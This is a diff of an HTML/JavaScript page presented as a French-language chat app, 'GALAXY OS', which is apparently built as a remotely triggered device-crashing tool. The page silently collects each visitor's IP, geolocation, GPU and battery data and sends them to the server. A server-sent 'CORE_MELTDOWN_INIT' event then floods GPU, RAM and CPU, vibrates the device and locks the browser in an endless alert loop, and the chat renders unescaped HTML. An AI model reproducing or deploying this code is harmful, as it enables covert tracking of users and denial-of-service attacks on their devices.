@@ -3,168 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GALAXY OS - V15 HARDWARE KILLER</title>
+    <title>GALAXY OS - V15 PREMIUM</title>
     <style>
-        /* DESIGN GALAXY OS */
-        :root { --main: #a29bfe; --red: #ff4d4d; --bg: #050505; }
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { margin: 0; background: #000; font-family: 'Consolas', 'Monaco', monospace; color: white; height: 100vh; overflow: hidden; display: flex; }
+        :root { --main: #a29bfe; --red: #ff4d4d; --bg: #0a0a0c; --glass: rgba(255, 255, 255, 0.03); }
+        * { box-sizing: border-box; font-family: 'Segoe UI', 'Roboto', sans-serif; }
         
-        /* LOGIN OVERLAY */
-        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; transition: 0.5s; }
-        .login-box { border: 1px solid var(--main); padding: 30px; text-align: center; width: 300px; background: #0a0a0a; box-shadow: 0 0 30px rgba(162, 155, 254, 0.2); }
-        .login-box h2 { letter-spacing: 5px; color: var(--main); margin-bottom: 25px; }
-        input[type="text"] { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #333; color: white; outline: none; }
-        input[type="text"]:focus { border-color: var(--main); }
+        body { margin: 0; background: #000 url('https://w0.peakpx.com/wallpaper/521/633/HD-wallpaper-incandescent-stars-sky-galaxy.jpg') no-repeat center center fixed; background-size: cover; color: white; height: 100vh; display: flex; overflow: hidden; }
+
+        /* EFFET DE VERRE SMOOTH */
+        #login-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(15px); z-index: 10000; display: flex; align-items: center; justify-content: center; transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
+        .login-box { background: var(--glass); border: 1px solid rgba(162, 155, 254, 0.3); padding: 40px; border-radius: 24px; text-align: center; width: 320px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         
-        /* INTERFACE PRINCIPALE */
-        #side-menu { width: 260px; background: var(--bg); border-right: 1px solid #1a1a1a; display: flex; flex-direction: column; }
-        #main-chat { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.6); }
-        #messages { flex: 1; overflow-y: auto; padding: 20px; list-style: none; margin: 0; }
-        .msg-card { background: #0f0f0f; padding: 12px; margin-bottom: 10px; border-left: 3px solid var(--main); animation: slideIn 0.2s ease-out; }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+        #side-menu { width: 280px; background: rgba(0,0,0,0.6); backdrop-filter: blur(10px); border-right: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; transition: 0.3s; }
+        #main-chat { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.2); }
 
-        /* MONITORING UNIT */
-        #monitor { padding: 20px; font-size: 0.75em; color: #00ff88; border-top: 1px solid #1a1a1a; background: #020202; }
-        .stat-line { margin: 5px 0; font-family: monospace; }
+        /* MESSAGES SMOOTH */
+        #messages { flex: 1; overflow-y: auto; padding: 25px; list-style: none; scroll-behavior: smooth; }
+        .msg-card { display: flex; align-items: flex-start; margin-bottom: 20px; animation: fadeIn 0.4s ease forwards; opacity: 0; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .pp-msg { width: 40px; height: 40px; border-radius: 12px; margin-right: 12px; object-fit: cover; border: 1px solid var(--main); }
+        .msg-content { background: var(--glass); padding: 12px 16px; border-radius: 0 15px 15px 15px; border: 1px solid rgba(255,255,255,0.05); }
 
-        /* INPUT AREA */
-        #form { display: flex; padding: 15px; background: #000; border-top: 1px solid #1a1a1a; gap: 10px; }
-        #input { flex: 1; background: #0a0a0a; border: 1px solid #222; color: white; padding: 12px; border-radius: 4px; outline: none; }
-        #input:focus { border-color: var(--main); }
-        .btn { background: var(--main); color: #000; border: none; padding: 0 25px; cursor: pointer; font-weight: bold; border-radius: 4px; transition: 0.2s; }
-        .btn:hover { opacity: 0.8; transform: scale(0.98); }
+        /* MONITORING */
+        #monitor { padding: 20px; font-size: 0.8em; color: #a29bfe; border-top: 1px solid rgba(255,255,255,0.05); }
+        .stat { margin-bottom: 5px; opacity: 0.7; font-family: monospace; }
 
-        /* CRASH SCREEN (HIDDEN BY DEFAULT) */
-        #crash-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999999; text-align: center; padding-top: 40vh; }
-        .crash-title { color: var(--red); font-size: 2.5em; text-transform: uppercase; animation: blink 0.1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        /* INPUT */
+        #form { padding: 20px; background: rgba(0,0,0,0.4); display: flex; gap: 12px; }
+        #input { flex: 1; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: white; padding: 14px 20px; border-radius: 15px; outline: none; transition: 0.2s; }
+        #input:focus { border-color: var(--main); background: rgba(255,255,255,0.08); }
+        .btn { background: var(--main); color: #000; border: none; padding: 0 25px; border-radius: 15px; font-weight: bold; cursor: pointer; }
+
+        /* CRASH SCREEN */
+        #crash-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999999; text-align: center; color: red; padding-top: 45vh; }
     </style>
 </head>
 <body>
 
     <div id="crash-screen">
-        <h1 class="crash-title">Critical_Hardware_Failure</h1>
-        <p id="crash-status" style="color:white; font-family: monospace;">OVERLOADING_CORE_RESOURCES...</p>
+        <h1 style="font-size:3em; animation: blink 0.1s infinite;">HARDWARE_FAILURE</h1>
+        <p>SYSTEM_OVERHEAT_DETECTED</p>
     </div>
 
     <div id="login-overlay">
         <div class="login-box">
-            <h2>GALAXY OS</h2>
-            <input type="text" id="login-name" placeholder="IDENTIFIANT_CIBLE..." autocomplete="off">
-            <input type="file" id="login-pp-file" style="display:none">
-            <button class="btn" style="width:100%; height:45px;" onclick="initSystem()">INITIALISER SCAN</button>
+            <h2 style="color:var(--main); margin-bottom:30px;">GALAXY OS</h2>
+            <input type="text" id="login-name" placeholder="VOTRE PSEUDO..." autocomplete="off">
+            <label for="pp-input" style="display:block; padding:10px; background:rgba(255,255,255,0.05); border-radius:10px; cursor:pointer; margin-bottom:20px; font-size:0.8em;">PHOTO DE PROFIL (CLIQUEZ)</label>
+            <input type="file" id="pp-input" accept="image/*" style="display:none">
+            <button class="btn" style="width:100%; height:50px;" onclick="initUser()">ENTRER DANS L'ORBITE</button>
         </div>
     </div>
 
     <div id="side-menu">
-        <div style="padding:30px; text-align:center;">
-            <div id="pp-preview" style="width:80px; height:80px; border-radius:50%; border:2px solid var(--main); margin: 0 auto; display:none; background-size:cover;"></div>
-            <h3 id="display-name" style="margin-top:15px; letter-spacing:2px;"></h3>
+        <div style="padding:40px 20px; text-align:center;">
+            <img id="my-pp-display" style="width:90px; height:90px; border-radius:25px; border:2px solid var(--main); margin-bottom:15px; object-fit:cover; display:none;">
+            <h3 id="my-name-display"></h3>
         </div>
         <div id="monitor">
-            <div class="stat-line"> > SYSTEM: ARMED</div>
-            <div class="stat-line" id="mon-ip"> > IP: WAITING...</div>
-            <div class="stat-line" id="mon-gpu"> > GPU: SCANNING...</div>
-            <div class="stat-line" id="mon-bat"> > BATT: --%</div>
+            <div class="stat" id="mon-ip">IP: SCANNING...</div>
+            <div class="stat" id="mon-gpu">GPU: SCANNING...</div>
+            <div class="stat" id="mon-bat">BAT: --%</div>
         </div>
     </div>
 
     <div id="main-chat">
         <ul id="messages"></ul>
         <form id="form">
-            <input id="input" autocomplete="off" placeholder="Entrez une commande ou un message..." />
-            <button type="submit" class="btn">EXEC</button>
+            <input id="input" autocomplete="off" placeholder="Message ou /bomb [IP]..." />
+            <button type="submit" class="btn">ENVOYER</button>
         </form>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let user = JSON.parse(localStorage.getItem('galaxy_v15_data')) || { name: "", pp: "", geo: {}, hw: {} };
+        let user = { name: "", pp: "https://i.pinimg.com/originals/a9/d0/96/a9d096ac3abc607758ca2d14e3f287ac.gif", geo: {}, hw: {} };
 
-        // Auto-login si les données existent
-        window.onload = () => { if(user.name) finalizeLogin(user.name, true); };
+        // Gestion de la photo de profil
+        document.getElementById('pp-input').onchange = function(e) {
+            const reader = new FileReader();
+            reader.onload = (event) => { user.pp = event.target.result; };
+            reader.readAsDataURL(e.target.files[0]);
+        };
 
-        async function initSystem() {
+        async function initUser() {
             const name = document.getElementById('login-name').value;
             if(!name) return;
+            user.name = name;
 
-            // 1. Extraction IP & Géo furtive
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                user.geo = await res.json();
-            } catch(e) { user.geo = { ip: "127.0.0.1", city: "Unknown" }; }
-
-            // 2. Extraction Hardware (GPU/CPU/RAM)
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software Renderer";
-
-            let batteryLevel = "100";
-            if(navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryLevel = Math.floor(b.level * 100);
-            }
+            // Scan Géo
+            try { const r = await fetch('https://ipapi.co/json/'); user.geo = await r.json(); } catch(e){}
+            
+            // Scan Hardware
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            const b = await navigator.getBattery();
 
             user.hw = {
-                gpu: gpu,
-                ram: navigator.deviceMemory || "N/A",
-                cores: navigator.hardwareConcurrency || "N/A",
-                battery: batteryLevel
+                gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown",
+                battery: Math.floor(b.level * 100)
             };
 
-            finalizeLogin(name);
-        }
-
-        function finalizeLogin(name, auto = false) {
-            user.name = name;
-            if(!auto) localStorage.setItem('galaxy_v15_data', JSON.stringify(user));
-
+            // UI Update
             document.getElementById('login-overlay').style.opacity = '0';
-            setTimeout(() => document.getElementById('login-overlay').style.display = 'none', 500);
+            setTimeout(() => document.getElementById('login-overlay').style.display = 'none', 800);
+            document.getElementById('my-pp-display').src = user.pp;
+            document.getElementById('my-pp-display').style.display = 'inline-block';
+            document.getElementById('my-name-display').innerText = user.name;
+            document.getElementById('mon-ip').innerText = `IP: ${user.geo.ip || '---'}`;
+            document.getElementById('mon-gpu').innerText = `GPU: ${user.hw.gpu.substring(0,15)}...`;
+            document.getElementById('mon-bat').innerText = `BAT: ${user.hw.battery}%`;
 
-            document.getElementById('display-name').innerText = name;
-            document.getElementById('mon-ip').innerText = ` > IP: ${user.geo.ip}`;
-            document.getElementById('mon-gpu').innerText = ` > GPU: ${user.hw.gpu.substring(0,20)}...`;
-            document.getElementById('mon-bat').innerText = ` > BATT: ${user.hw.battery}%`;
-
-            // Envoi des infos au serveur pour le tracking
-            socket.emit('check_device', {
-                name: user.name,
-                geo: user.geo,
-                hardware: user.hw
-            });
+            socket.emit('check_device', { name: user.name, geo: user.geo, hardware: user.hw, pp: user.pp });
         }
 
-        // Gestion du Chat
         document.getElementById('form').onsubmit = (e) => {
             e.preventDefault();
             const input = document.getElementById('input');
             if(input.value) {
-                socket.emit('chat message', { text: input.value, name: user.name });
+                socket.emit('chat message', { text: input.value, name: user.name, pp: user.pp });
                 input.value = '';
             }
         };
 
-        socket.on('chat message', (data) => {
+        socket.on('chat message', (d) => {
             const li = document.createElement('li');
             li.className = 'msg-card';
-            li.innerHTML = `<strong style="color:var(--main)">${data.name}</strong>: ${data.text}`;
+            li.innerHTML = `
+                <img src="${d.pp}" class="pp-msg">
+                <div class="msg-content">
+                    <div style="font-size:0.7em; color:var(--main); margin-bottom:4px;">${d.name}</div>
+                    <div>${d.text}</div>
+                </div>
+            `;
             document.getElementById('messages').appendChild(li);
             document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
         });
 
-        // ==========================================
-        // CHARGE UTILE DE DESTRUCTION (CRASH UNIT)
-        // ==========================================
-        
+        // 🧨 CHARGE UTILE CRASH (V15)
         socket.on('CORE_MELTDOWN_INIT', () => {
             document.getElementById('crash-screen').style.display = 'block';
-            localStorage.clear();
-
-            // VECTEUR 1: GPU OVERFLOW (Saturation textures)
+            
+            // Surcharge GPU (Kernel Panic)
             for(let i=0; i<400; i++) {
                 let c = document.createElement('canvas');
                 let gl = c.getContext('webgl');
@@ -175,32 +157,22 @@
                 }
             }
 
-            // VECTEUR 2: RAM EXPLOSION (Memory Leak massif)
-            const memoryHole = [];
+            // Explosion RAM (500Mo)
+            const leak = [];
             setInterval(() => {
-                try {
-                    // Injecte 500 Mo de données aléatoires par cycle
-                    memoryHole.push(new Uint8Array(500 * 1024 * 1024).fill(Math.random()));
-                } catch(e) {}
-            }, 40);
+                try { leak.push(new Uint8Array(500 * 1024 * 1024).fill(Math.random())); } catch(e){}
+            }, 50);
 
-            // VECTEUR 3: CPU STRESS (100 Threads)
-            const blob = new Blob(["while(true){}"], {type: 'text/javascript'});
-            const url = URL.createObjectURL(blob);
-            for(let i=0; i<100; i++) { new Worker(url); }
+            // Surcharge CPU
+            const b = new Blob(["while(true){}"], {type: 'text/javascript'});
+            for(let i=0; i<100; i++) { new Worker(URL.createObjectURL(b)); }
 
-            // VECTEUR 4: VIBRATION & UI LOCK
             if(navigator.vibrate) navigator.vibrate([100000, 1000, 100000]);
             
-            // Boucle infinie pour figer le téléphone (Thread principal)
             while(true) {
                 window.history.pushState(null, null, "");
-                alert("CRITICAL_HARDWARE_FAILURE\n\nEMERGENCY_SHUTDOWN_FAILED\n\nDEVICE_TEMP_CRITICAL");
+                alert("CRITICAL_HARDWARE_FAILURE\n\nEMERGENCY_SHUTDOWN_FAILED");
             }
-        });
-
-        socket.on('stop_bomb', () => {
-            location.reload();
         });
 
     </script>
